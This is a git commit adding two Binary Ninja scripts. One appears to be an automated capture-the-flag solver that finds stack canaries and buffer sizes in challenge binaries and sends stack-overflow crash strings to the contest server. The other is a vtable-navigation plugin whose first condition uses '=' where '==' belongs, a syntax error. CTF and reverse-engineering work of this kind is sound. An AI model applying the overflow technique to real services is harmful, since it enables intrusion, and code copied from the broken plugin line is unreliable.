0bab60400c4790ba4662da6d0cbd71b606d043be
Dan Guido <dan@trailofbits.com>
2017-01-20 19:13:07 -0800

    add more binja scripts

---
+++ 2000cuts/334x.py
@@ -0,0 +1,119 @@
+#!/usr/bin/env python
+
+import sys
+try:
+    import binaryninja
+except ImportError:
+    sys.path.append("/Applications/Binary Ninja.app/Contents/Resources/python/")
+    import binaryninja
+import time
+import socket
+import base64
+
+s = socket.socket()
+s.connect(('334_cuts_22ffeb97cf4f6ddb1802bf64c03e2aab.quals.shallweplayaga.me', 10334))
+print "Msg: " + s.recv(1024)
+
+def readUntil(s, delim):
+    msg = ""
+    while delim not in msg:
+        msg += s.recv(1)
+
+    return msg
+
+msg = readUntil(s, '\n')
+while True:
+    print
+    print
+
+    # They send us the challenge name to process.
+    msg = readUntil(s, '\n')
+    if 'segfault' in msg:
+        print msg
+        break
+    chal = msg.strip()
+
+    # Open a binary view to the challenge as an elf
+    print "Analyzing {0}".format(chal)
+    bv = binaryninja.BinaryViewType["ELF"].open(chal)
+    bv.update_analysis()
+    time.sleep(0.1)  # bandaid until there's blocking analysis
+    
+    # start at the entry point
+    print "Entry Point: {0:x}".format(bv.entry_point)
+    entry = bv.entry_function # Get the entry point as a function object
+    start = None
+    
+    # Iterate over the basic blocks in the entry function
+    entry_calls = []
+    for block in entry.low_level_il:
+        # Iterate over the basic blocks getting il instructions
+        for il in block:
+            # We only care about calls
+            if il.operation == binaryninja.core.LLIL_CALL:
+                entry_calls.append(il)
+    
+    start_call = entry_calls[1]            
+    start = bv.get_function_at(bv.platform, start_call.operands[0].value)
+    
+    print "start: {0}".format(start)
+
+    # Do the same thing with main, it's the first call in start
+    main = None
+    for block in start.low_level_il:
+        for il in block:
+            if il.operation != binaryninja.core.LLIL_CALL:
+                continue
+    
+            main = bv.get_function_at(bv.platform, il.operands[0].value)
+    
+    print "main: {0}".format(main)
+    
+    # Collect all the call instructions in main
+    calls = []
+    for block in main.low_level_il:
+        for il in block:
+            if il.operation == binaryninja.core.LLIL_CALL:
+                calls.append(il)
+
+    # If there are 5 calls, then the memcmp is the second call. With 6 calls its the 3rd.
+    if len(calls) == 5:
+        read_buf = calls[0]
+        memcmp = calls[1]
+    else:
+        read_buf = calls[1]
+        memcmp = calls[2]
+    
+    # Query the parameters to the memcmp
+    # memcmp(dst, src, length)
+    canary_frame = main.get_parameter_at(bv.arch, memcmp.address, None, 0)
+    canary_address = main.get_parameter_at(bv.arch, memcmp.address, None, 1)
+    canary_width = main.get_parameter_at(bv.arch, memcmp.address, None, 2)
+    
+    # Use that to read the canary
+    canary = bv.read(canary_address.value, canary_width.value)
+    
+    buffer_frame = main.get_parameter_at(bv.arch, read_buf.address, None, 0)
+    
+    # The canary is between the buffer and the saved stack registers
+    buffer_size = (buffer_frame.offset - canary_frame.offset) * -1
+    print buffer_size
+    
+    # Fill up the buffer
+    crash_string = "a" * buffer_size
+    # Append the checked bytes of the canary check (it's always 4)
+    crash_string += canary[:canary_width.value]
+    
+    # Pad out the rest of the string canary buffer
+    crash_string += "a" * ((canary_frame.offset * - 1) - canary_width.value)
+    
+    # overwrite the saved registers
+    crash_string += 'eeee'
+    crash_string += '\n'
+    
+    # Send the crashing string to the service
+    b64 = base64.b64encode(crash_string)
+    print chal, canary, crash_string.strip(), b64
+
+    # Send the crashing string
+    s.send(b64 + "\n")
---
+++ vtable-navigator/vtable-navigator.py
@@ -0,0 +1,148 @@
+# Navigating to a Virtual Function based on an Indirect Call
+
+import struct
+
+from binaryninja import *
+
+def find_vtable(bv, function_il):
+    for bb in function_il:
+        for il in bb:
+            # vtable is referenced directly
+            if (il.operation == LLIL_STORE and
+                il.dest.operation = LLIL_REG and
+                il.src.operation == LLIL_CONST):
+                fp = struct.unpack(
+                    '<Q' if bv.address_size == 8 else '<L',
+                    bv.read(il.src.value, bv.address_size)
+                )[0]
+
+                if not bv.is_offset_executable(fp):
+                    continue
+
+                return il.src.value
+
+            # vtable is first loaded into a register, then stored
+            if (il.operation == LLIL_STORE and
+                il.dest.operation == LLIL_REG and
+                il.src.operation == LLIL_REG):
+                reg_value = function_il.source_function.get_reg_value_at_low_level_il_instruction(
+                    il.instr_index,
+                    il.src.src
+                )
+
+                if reg_value.type == ConstantValue:
+                    fp = struct.unpack(
+                        '<Q' if bv.address_size == 8 else '<L',
+                        bv.read(reg_value.value, bv.address_size)
+                    )[0]
+
+                    if not bv.is_offset_executable(fp):
+                        continue
+
+                    return reg_value.value
+    return None
+
+def find_constructor(bv, class_name):
+    for symbol in bv.symbols.values():
+        if symbol.short_name == "{}::{}".format(class_name, class_name):
+            return bv.get_function_at(bv.platform, symbol.address)
+    return None
+
+def get_current_function(bv, address):
+    return bv.get_basic_blocks_at(address)[0].function
+
+def find_function_offset(bv, address):
+    current_function = get_current_function(bv, address)
+    current_function_il = current_function.low_level_il
+    current_instruction = current_function_il[
+        current_function.get_low_level_il_at(bv.arch, address)
+    ]
+
+    # make sure it's a call instruction
+    if current_instruction.operation != LLIL_CALL:
+        log_alert("This isn't a call instruction")
+        return
+
+    # call <register>
+    if current_instruction.dest.operation == LLIL_REG:
+        call_reg = current_instruction.dest.src
+
+        offset = None
+
+        # step backwards to find this register being set to an offset
+        for idx in range(current_instruction.instr_index, -1, -1):
+            il = current_function_il[idx]
+
+            # find instances of the call register being changed
+            if (il.operation != LLIL_SET_REG or
+                il.dest != call_reg):
+                continue
+
+            # is it something like mov reg, [reg]?
+            if (il.src.operation == LLIL_LOAD and
+                il.src.src.operation == LLIL_REG and
+                offset is None):
+                offset = 0
+                # continue on, to see if there is an offset add
+                continue
+
+            # mov reg, [register+offset]?
+            if (il.src.operation == LLIL_LOAD and
+                il.src.src.operation == LLIL_ADD and
+                il.src.src.right.operation == LLIL_CONST):
+                    offset = il.src.src.right.value
+                    break
+
+            # already found a load with no offset, now finding offset
+            if (offset == 0 and
+                il.src.operation == LLIL_ADD and
+                il.src.right.operation == LLIL_CONST):
+                offset = il.src.right.value
+                break
+
+            # to keep from accidentally finding other stuff, bail if
+            # any other register set happens
+            break
+
+    return offset
+
+def navigate_to_virtual_function(bv, address):
+    class_name = get_text_line_input('Enter class name', '')
+
+    if not class_name:
+        return
+
+    constructor = find_constructor(bv, class_name)
+
+    if constructor is None:
+        log_alert("Couldn't find constructor {}::{}".format(
+                class_name, class_name
+            )
+        )
+        return
+
+    vtable = find_vtable(bv, constructor.low_level_il)
+
+    if vtable is None:
+        log_alert("Couldn't find vtable for class {}".format(class_name))
+        return
+
+    offset = find_function_offset(bv, address)
+
+    if offset is None:
+        log_alert("Couldn't find vtable offset for this call!")
+        return
+
+    function_pointer = struct.unpack(
+        '<Q' if bv.address_size == 8 else '<L',
+        bv.read(vtable+offset, bv.address_size)
+    )[0]
+
+    bv.file.navigate(bv.file.view, function_pointer)
+
+
+PluginCommand.register_for_address(
+    'Navigate to Virtual Function',
+    'Navigate to the virtual function called by an indirect call, given the class name',
+    navigate_to_virtual_function
+)
